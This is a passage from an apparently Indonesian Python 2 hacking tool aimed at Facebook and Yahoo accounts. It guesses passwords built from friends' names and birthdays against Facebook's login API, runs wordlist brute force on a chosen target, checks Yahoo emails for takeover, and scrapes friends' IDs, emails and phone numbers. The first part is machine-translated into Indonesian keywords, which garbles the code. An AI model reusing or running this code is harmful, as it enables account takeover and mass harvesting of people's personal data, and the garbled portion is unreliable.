                untuk saya di s 'data']:
                    id.append (i ['id'])
                    
            lain:
                jika puncak == '3':
                    os.system ('jelas')
                    cetak logo
                    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
                    mencoba:
                        idlist = raw_input ('\ x1b [1; 91m [+] \ x1b [1; 92mFile ID \ x1b [1; 91m: \ x1b [1; 97m')
                        untuk baris terbuka (idlist, 'r'). readlines ():
                        	id.append (line.strip ())
                    kecuali IOError:
                        cetak '\ x1b [1; 91m [!] File tidak ditemukan'
                        raw_input ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                        super()

                lain:
                    jika puncak == '0':
                        menu_hack ()
                    lain:
                        cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] \ x1b [1; 97m' + puncak + '\ x1b [1; 91mTidak ada'
                        pilih_super ()
    cetak '\ x1b [1; 91m [+] \ x1b [1; 92mTotal ID \ x1b [1; 91m: \ x1b [1; 97m' + str (len (id))
    jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...')
    titik = ['. ',' .. ',' ... ']
    untuk o di titik:
        cetak '\ r \ r \ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ xb8 \ x1b [1; 91m] \ x1b [1; 92mCrack \ x1b [1; 97m' + o,
        sys.stdout.flush ()
        time.sleep (1)

    mencetak
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'

    def main (arg):
        pengguna = arg
        mencoba:
                a = requests.get ('https://graph.facebook.com/' + user + '/? access_token =' + toket)
                b = json.loads (a.text)
                pass1 = b ['first_name'] + '123'
                data = urllib.urlopen ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&&==&&= ur=id&em==& ur=id & urus==&p=id) = ios & menghasilkan_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
                q = json.load (data)
                jika 'access_token' di q:
                    cetak '\ x1b [1; 97m [\ x1b [1; 92mOK \ xe2 \ x9c \ x93 \ x1b [1; 97m]' + pengguna + '| '+ pass1
                lain:
                    jika 'www.facebook.com' di q ['error_msg']:
                        cetak '\ x1b [1; 97m [\ x1b [1; 93mCP \ xe2 \ x9c \ x9a \ x1b [1; 97m]' + pengguna + '| '+ pass1
                    lain:
                            pass2 = b ['firs_name'] + '12345'
                            data = urllib.urlopen ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&&==&&= ur=id&em==& ur=id & urus== & ur=4 ur & = ios & menghasilkan_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
                            q = json.load (data)
                            jika 'access_token' di q:
                                cetak '\ x1b [1; 97m [\ x1b [1; 92mOK \ xe2 \ x9c \ x93 \ x1b [1; 97m]' + pengguna + '| '+ pass2
                            lain:
                                jika 'www.facebook.com' di q ['error_msg']:
                                    cetak '\ x1b [1; 97m [\ x1b [1; 93mCP \ xe2 \ x9c \ x9a \ x1b [1; 97m]' + pengguna + '| '+ pass2
                                lain:
                                        pass3 = b ['last_name'] + '123'
                                        data = urllib.urlopen ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&em==&&== ur & password & urus== ur & = ios & menghasilkan_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
                                        q = json.load (data)
                                        jika 'access_token' di q:
                                            cetak '\ x1b [1; 97m [\ x1b [1; 92mOK \ xe2 \ x9c \ x93 \ x1b [1; 97m]' + pengguna + '| '+ pass3
                                        lain:
                                            jika 'www.facebook.com' di q ['error_msg']:
                                                cetak '\ x1b [1; 97m [\ x1b [1; 93mCP \ xe2 \ x9c \ x9a \ x1b [1; 97m]' + pengguna + '| '+ pass3
                                            lain:
                                                    lahir = b ['ulang tahun']
                                                    pass4 = lahir.replace ('/', '')
                                                    data = urllib.urlopen ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&&==&&= ur=id&em==& ur=id & urus==&p=id) = ios & menghasilkan_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
                                                    q = json.load (data)
                                                    jika 'access_token' di q:
                                                        cetak '\ x1b [1; 97m [\ x1b [1; 92mOK \ xe2 \ x9c \ x93 \ x1b [1; 97m]' + pengguna + '| '+ pass4
                                                    lain:
                                                        jika 'www.facebook.com' di q ['error_msg']:
                                                            cetak '\ x1b [1; 97m [\ x1b [1; 93mCP \ xe2 \ x9c \ x9a \ x1b [1; 97m]' + pengguna + '| '+ pass4
                                                        lain:
                                                            pass5 = ('sayang')                                          
                                                            data = urllib.urlopen ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&em==&&== ur & password & urus' ur & urus 'ur & user' ur = ios & menghasilkan_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
                                                            q = json.load (data)
                                                            jika 'access_token' di q:
                                                                cetak '\ x1b [1; 97m [\ x1b [1; 92mOK \ xe2 \ x9c \ x93 \ x1b [1; 97m]' + pengguna + '| '+ pass4
                                                            lain:
                                                                jika 'www.facebook.com' di q ['error_msg']:
                                                                    cetak '\ x1b [1; 97m [\ x1b [1; 93mCP \ xe2 \ x9c \ x9a \ x1b [1; 97m]' + pengguna + '| '+ pass5
        kecuali:
            lulus

    p = ThreadPool (30)
    p.map (utama, id)
    cetak '\ n \ x1b [1; 91m [+] \ x1b [1; 97mFinish'
    raw_input ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
    super()


def brute ():
    os.system ('jelas')
    mencoba:
        toket = open ('login.txt', 'r'). read ()
    kecuali IOError:
        cetak '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        time.sleep (1)
        masuk()
    lain:
        os.system ('jelas')
        cetak logo
        cetak '╔' + 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
        mencoba:
            email = raw_input ('\ x1b [1; 91m [+] \ x1b [1; 92mID \ x1b [1; 97m / \ x1b [1; 92mEmail \ x1b [1; 97m / \ x1b [1; 92mHp \ x1b [1; ; 97mTarget \ x1b [1; 91m: \ x1b [1; 97m ')
            passw = raw_input ('\ x1b [1; 91m [+] \ x1b [1; 92mWordlist \ x1b [1; 97mext (list.txt) \ x1b [1; 91m: \ x1b [1; 97m')
            total = terbuka (kata sandi, 'r')
            total = total.readlines ()
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mTarget \ x1b [1; 91m: \ x1b [1; 97m' + email
            cetak '\ x1b [1; 91m [+] \ x1b [1; 92mTotal \ x1b [1; 96m' + str (len (total)) + '\ x1b [1; 92mPassword'
            jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...')
            sandi = open (passw, 'r')
            untuk pw dalam sandi:
                mencoba:
                    pw = pw.replace ('\ n', '')
                    sys.stdout.write ('\ r \ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ xb8 \ x1b [1; 91m] \ x1b [1; 92mCoba \ x1b [1; 97m' + pw )
                    sys.stdout.flush ()
                    data = requests.get ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' email & ur + ur & ur 'ur domain & password' ur = ios & menghasilkan_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
                    mpsh = json.loads (data.text)
                    jika 'access_token' di mpsh:
                        dapat = open ('Brute.txt', 'w')
                        dapat.write (email + '|' + pw + '\ n')
                        dapat.close ()
                        cetak '\ n \ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                        cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
                        cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPengguna \ x1b [1; 91m: \ x1b [1; 97m' + email
                        cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 91m: \ x1b [1; 97m' + pw
                        keluar ()
                    lain:
                        jika 'www.facebook.com' di mpsh ['error_msg']:
                            ceks = terbuka ('Brutecekpoint.txt', 'w')
                            ceks.write (email + '|' + pw + '\ n')
                            ceks.close ()
                            cetak '\ n \ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
                            cetak '\ x1b [1; 91m [!] \ x1b [1; 93mAkun Mungkin Pos Pemeriksaan'
                            cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPengguna \ x1b [1; 91m: \ x1b [1; 97m' + email
                            cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 91m: \ x1b [1; 97m' + pw
                            keluar ()
                kecuali requests.exceptions.ConnectionError:
                    cetak '\ x1b [1; 91m [!] Kesalahan Koneksi'
                    time.sleep (1)

        kecuali IOError:
            cetak '\ x1b [1; 91m [!] File tidak ditemukan ...'
            cetak '\ n \ x1b [1; 91m [!] \ x1b [1; 92mMungkin kamu tidak memiliki daftar kata'
            tanyaw ()


def tanyaw ():
    why = raw_input ('\ x1b [1; 91m [?] \ x1b [1; 92mApakah Anda yakin ingin membuat daftar kata? \ x1b [1; 92m [y / t] \ x1b [1; 91m: \ x1b [1; 97 m ')
    jika mengapa == '':
        cetak '\ x1b [1; 91m [!] Silakan pilih \ x1b [1; 97m (y / t)'
        tanyaw ()
    lain:
        jika mengapa == 'y':
            Daftar kata()
        lain:
            jika mengapa == 'Y':
                Daftar kata()
            lain:
                jika mengapa == 't':
                    menu_hack ()
                lain:
                    jika mengapa == 'T':
                        menu_hack ()
                    lain:
                        cetak '\ x1b [1; 91m [!] Silakan pilih \ x1b [1; 97m (y / t)'
                        tanyaw ()


def menu_yahoo ():
    os.system ('jelas')
    mencoba:
        toket = open ('login.txt', 'r'). read ()
    kecuali IOError:
        cetak '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        time.sleep (1)
        masuk()

    os.system ('jelas')
    cetak logo
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    cetak '║-> \ x1b [1; 37; 40m1. Dari teman'
    cetak '║-> \ x1b [1; 37; 40m2. Dari File '
    cetak '║-> \ x1b [1; 31; 40m0. Kembali'
    cetak '\ x1b [1; 37; 40m║'
    yahoo_pilih ()


def yahoo_pilih ():
    go = raw_input ('╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m')
    jika pergi == '':
        cetak '\ x1b [1; 91m [!] Tidak dapat kosong'
        yahoo_pilih ()
    lain:
        jika pergi == '1':
            yahoofriends ()
        lain:
            jika pergi == '2':
                yahoolist ()
            lain:
                jika pergi == '0':
                    menu_hack ()
                lain:
                    cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] \ x1b [1; 97m' + buka + '\ x1b [1; 91tidak ditemukan'
                    yahoo_pilih ()


def yahoofriends ():
    os.system ('jelas')
    mencoba:
        toket = open ('login.txt', 'r'). read ()
    kecuali IOError:
        cetak '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        time.sleep (1)
        masuk()

    os.system ('jelas')
    cetak logo
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    mpsh = []
    jml = 0
    jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...')
    friends = requests.get ('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads (friends.text)
    save = open ('MailVuln.txt', 'w')
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    untuk w di kimak ['data']:
        jml + = 1
        mpsh.append (jml)
        id = w ['id']
        nama = w ['name']
        links = requests.get ('https://graph.facebook.com/' + id + '? access_token =' + toket)
        z = json.loads (links.text)
        mencoba:
            mail = z ['email']
            yahoo = re.compile ('@. *')
            otw = yahoo.search (mail) .group ()
            if 'yahoo.com' dalam otw:
                br.open ('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = Benar
                br.select_form (nr = 0)
                br ['username'] = email
                klik = br.submit (). read ()
                jok = re.compile ('"messages.ERROR_INVALID_USERNAME">. *')
                mencoba:
                    pek = jok.search (klik) .group ()
                kecuali:
                    cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] \ x1b [1; 92mEmail \ x1b [1; 91m: \ x1b [1; 91m' + mail + '\ x1b [1; 97m [\ x1b [ 1; 92m '+ vulnot +' \ x1b [1; 97m] '
                    terus

                jika '"messages.ERROR_INVALID_USERNAME">' di pek:
                    save.write (mail + '\ n')
                    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
                    cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m' + nama
                    cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mID \ x1b [1; 91m: \ x1b [1; 97m' + id
                    cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mEmail \ x1b [1; 91m: \ x1b [1; 97m' + mail + '[\ x1b [1; 92m' + vuln + '\ x1b [1; 97m]'
                    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
                lain:
                    cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] \ x1b [1; 92mEmail \ x1b [1; 91m: \ x1b [1; 91m' + mail + '\ x1b [1; 97m [\ x1b [ 1; 92m '+ vulnot +' \ x1b [1; 97m] '
        kecuali KeyError:
            lulus

    cetak '\ n \ x1b [1; 91m [+] \ x1b [1; 97mFinish'
    cetak '\ x1b [1; 91m [+] \ x1b [1; 97mSimpan \ x1b [1; 91m: \ x1b [1; 97m MailVuln.txt'
    save.close ()
    raw_input ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
    menu_yahoo ()


def yahoolist ():
    os.system ('jelas')
    mencoba:
        toket = open ('login.txt', 'r'). read ()
    kecuali IOError:
        cetak '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        time.sleep (1)
        masuk()
    lain:
        os.system ('jelas')
        cetak logo
        cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
        files = raw_input ('\ x1b [1; 91m [+] \ x1b [1; 92mFile \ x1b [1; 91m: \ x1b [1; 97m')
        mencoba:
            total = terbuka (file, 'r')
            mail = total.readlines ()
        kecuali IOError:
            cetak '\ x1b [1; 91m [!] File tidak ditemukan'
            raw_input ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            menu_yahoo ()

    mpsh = []
    jml = 0
    jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...')
    save = open ('MailVuln.txt', 'w')
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    print '\x1b[1;91m[?] \x1b[1;97mStatus \x1b[1;91m:  \x1b[1;97mRed[\x1b[1;92m' + vulnot + '\x1b[1;97m]  Green[\x1b[1;92m' + vuln + '\x1b[1;97m]'
    print
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                print '\x1b[1;91m ' + mail
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(mail + '\n')
                print '\x1b[1;92m ' + mail
            else:
                print '\x1b[1;91m ' + mail

    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
    print '\x1b[1;91m[+] \x1b[1;97mSaved \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_yahoo()


def grab():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '║-> \x1b[1;37;40m1. Get ID From Friends'
    print '║-> \x1b[1;37;40m2. Get Friends ID From Friends'
    print '║-> \x1b[1;37;40m3. Get ID From GRUP'
    print '║-> \x1b[1;37;40m4. Get Friends Email'
    print '║-> \x1b[1;37;40m5. Get Friends Email From Friends'
    print '║-> \x1b[1;37;40m6. Get Phone From Friends'
    print '║-> \x1b[1;37;40m7. Get Friend\'s Phone From Friends'
    print '║-> \x1b[1;31;40m0. Back'
    print '\x1b[1;37;40m║'
    grab_pilih()


def grab_pilih():
    cuih = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if cuih == '':
        print '\x1b[1;91m[!] Can\'t empty'
        grab_pilih()
    else:
        if cuih == '1':
            id_friends()
        else:
            if cuih == '2':
                idfrom_friends()
            else:
                if cuih == '3':
                    id_member_grup()
                else:
                    if cuih == '4':
                        email()
                    else:
                        if cuih == '5':
                            emailfrom_friends()
                        else:
                            if cuih == '6':
                                nomor_hp()
                            else:
                                if cuih == '7':
                                    hpfrom_friends()
                                else:
                                    if cuih == '0':
                                        menu_hack()
                                    else:
                                        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + cuih + ' \x1b[1;91mnot found'
                                        grab_pilih()


def id_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            save_id = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            bz = open(save_id, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for ah in z['data']:
                idfriends.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + ah['name']
                print '\x1b[1;92mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
                print 52 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + save_id
            bz.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(save_id)
            print '\x1b[1;91m[!] An error occurred'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def idfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID Friends \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Not be friends'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                grab()

            r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
            z = json.loads(r.text)
            save_idt = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            bz = open(save_idt, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for ah in z['friends']['data']:
                idfromfriends.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + ah['name']
                print '\x1b[1;92mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
                print 52 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idfromfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + save_idt
            bz.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def id_member_grup():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID grup \x1b[1;91m:\x1b[1;97m ')
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
                asw = json.loads(r.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName group \x1b[1;91m:\x1b[1;97m ' + asw['name']
            except KeyError:
                print '\x1b[1;91m[!] Group not found'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                grab()

            simg = raw_input('\x1b[1;91m[+] \x1b[1;97mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            b = open(simg, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&access_token=' + toket)
            s = json.loads(re.text)
            for i in s['data']:
                idmem.append(i['id'])
                b.write(i['id'] + '\n')
                print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + i['name']
                print '\x1b[1;92mID  \x1b[1;91m  :\x1b[1;97m ' + i['id']
                print 52 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idmem)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + simg
            b.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(simg)
            print '\x1b[1;91m[!] Group not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def email():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    em.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Email\x1b[1;96m%s' % len(em)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(mails)
            print '\x1b[1;91m[!] An error occurred'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def emailfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID Friends \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Not be friends'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                grab()

            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    emfromfriends.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Email\x1b[1;96m%s' % len(emfromfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
